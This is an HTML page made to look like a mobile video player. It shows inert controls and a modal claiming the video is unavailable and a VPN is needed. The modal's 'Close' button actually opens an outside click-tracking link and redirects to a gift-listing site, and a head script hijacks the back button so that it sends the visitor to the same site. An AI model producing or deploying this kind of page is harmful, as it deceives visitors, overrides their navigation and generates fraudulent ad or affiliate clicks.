<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Video Player</title>

  <!-- BBR -->
  <script>
    history.pushState(null, null, location.href);
    window.onpopstate = function () {
      location.href = 'https://fivoraco.com/gift/20-best-spring-mothers-day-gifts-shell-absolutely-love-in-2026/';
    };
  </script>

  <style>
    *,
    *::before,
    *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html,
    body {
      height: 100%;
      width: 100%;
      background: #000;
      font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
      overflow: hidden;
      user-select: none;
    }

    /* ── Full black player area ── */
    .player {
      position: relative;
      width: 100%;
      height: 100vh;
      background: #000;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* ── Ghost background ── */
    .player-bg {
      position: absolute;
      inset: 0;
      background-image: url('https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=1200&q=80&fit=crop&crop=top');
      background-size: cover;
      background-position: center top;
      opacity: 0;
      /* Slow fade-in: barely visible, like video trying to load */
      animation: ghostReveal 3s ease-out 1s forwards;
      z-index: 1;
    }

    /* Subtle dark vignette — top/bottom edges darken, center stays visible */
    .player-bg::after {
      content: '';
      position: absolute;
      inset: 0;
      background:
        linear-gradient(to bottom, rgba(0, 0, 0, 0.6) 0%, rgba(0, 0, 0, 0.05) 35%, rgba(0, 0, 0, 0.05) 65%, rgba(0, 0, 0, 0.7) 100%);
    }

    @keyframes ghostReveal {
      0% {
        opacity: 0;
      }

      40% {
        opacity: 0.45;
      }

      70% {
        opacity: 0.52;
      }

      100% {
        opacity: 0.38;
      }
    }

    /* ── Top control bar ── */
    .top-bar {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 14px 18px;
      z-index: 10;
    }

    .ctrl-btn {
      background: none;
      border: none;
      cursor: pointer;
      padding: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0.85;
    }

    /* ── Bottom control bar ── */
    .bottom-bar {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 14px 18px;
      z-index: 10;
    }

    /* ── Modal dialog ── */
    .modal-backdrop {
      position: absolute;
      inset: 0;
      z-index: 20;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }

    .modal {
      background: #f2f2f7;
      border-radius: 16px;
      width: 100%;
      max-width: 370px;
      padding: 28px 22px 16px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
    }

    .modal-title {
      font-size: 17px;
      font-weight: 600;
      color: #1c1c1e;
      margin-bottom: 14px;
      line-height: 1.3;
    }

    .modal-body {
      font-size: 15px;
      color: #3a3a3c;
      line-height: 1.55;
      margin-bottom: 20px;
    }

    .modal-footer {
      display: flex;
      justify-content: flex-end;
      padding-top: 4px;
    }

    .close-btn {
      background: none;
      border: none;
      font-size: 17px;
      font-weight: 500;
      color: #007aff;
      cursor: pointer;
      padding: 6px 4px;
      text-decoration: none;
      display: inline-block;
      -webkit-tap-highlight-color: transparent;
    }

    .close-btn:active {
      opacity: 0.5;
    }
  </style>
</head>

<body>

  <div class="player">

    <!-- Ghost background image -->
    <div class="player-bg"></div>

    <!-- Top bar: X | pip | volume -->
    <div class="top-bar">
      <!-- Close X -->
      <button class="ctrl-btn" aria-label="Close">
        <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
          <line x1="4" y1="4" x2="16" y2="16" stroke="#fff" stroke-width="2.2" stroke-linecap="round" />
          <line x1="16" y1="4" x2="4" y2="16" stroke="#fff" stroke-width="2.2" stroke-linecap="round" />
        </svg>
      </button>

      <!-- Picture-in-picture -->
      <button class="ctrl-btn" aria-label="PiP">
        <svg width="28" height="20" viewBox="0 0 28 20" fill="none">
          <rect x="1" y="1" width="26" height="18" rx="2.5" stroke="#fff" stroke-width="1.8" />
          <rect x="13" y="9" width="12" height="8" rx="1.5" stroke="#fff" stroke-width="1.5" fill="#000" />
        </svg>
      </button>

      <!-- Volume -->
      <button class="ctrl-btn" aria-label="Volume">
        <svg width="28" height="22" viewBox="0 0 28 22" fill="none">
          <path d="M8 7H4a1 1 0 00-1 1v6a1 1 0 001 1h4l6 5V2L8 7z" stroke="#fff" stroke-width="1.8"
            stroke-linejoin="round" />
          <path d="M18 6.5a6 6 0 010 9" stroke="#fff" stroke-width="1.8" stroke-linecap="round" />
          <path d="M21 3.5a10.5 10.5 0 010 15" stroke="#fff" stroke-width="1.8" stroke-linecap="round" />
        </svg>
      </button>
    </div>

    <!-- Bottom bar: cast | more -->
    <div class="bottom-bar">
      <!-- Cast -->
      <button class="ctrl-btn" aria-label="Cast">
        <svg width="26" height="22" viewBox="0 0 26 22" fill="none">
          <rect x="1" y="1" width="24" height="16" rx="2" stroke="#fff" stroke-width="1.8" />
          <path d="M8 21h10" stroke="#fff" stroke-width="1.8" stroke-linecap="round" />
          <path d="M13 17v4" stroke="#fff" stroke-width="1.8" stroke-linecap="round" />
          <path d="M1 14c3 0 5 1.5 5 5" stroke="#fff" stroke-width="1.8" stroke-linecap="round" />
          <path d="M1 10c5.5 0 9 3 9 9" stroke="#fff" stroke-width="1.8" stroke-linecap="round" />
          <circle cx="1" cy="19" r="1.5" fill="#fff" />
        </svg>
      </button>

      <!-- More options (...) -->
      <button class="ctrl-btn" aria-label="More">
        <svg width="26" height="8" viewBox="0 0 26 8" fill="none">
          <circle cx="4" cy="4" r="3" stroke="#fff" stroke-width="1.6" />
          <circle cx="13" cy="4" r="3" stroke="#fff" stroke-width="1.6" />
          <circle cx="22" cy="4" r="3" stroke="#fff" stroke-width="1.6" />
        </svg>
      </button>
    </div>

    <!-- Modal -->
    <div class="modal-backdrop">
      <div class="modal">
        <p class="modal-title">Video Unavailable!</p>
        <p class="modal-body">Please use a VPN to watch the video in your country use</p>
        <div class="modal-footer">
          <a class="close-btn" href="https://now.gotopsale.com/click" target="_blank"
            onclick="setTimeout(function() { window.location = 'https://fivoraco.com/gift/20-best-spring-mothers-day-gifts-shell-absolutely-love-in-2026/'; }, 100);">Close</a>
        </div>
      </div>
    </div>

  </div><!-- /.player -->



</body>

</html>
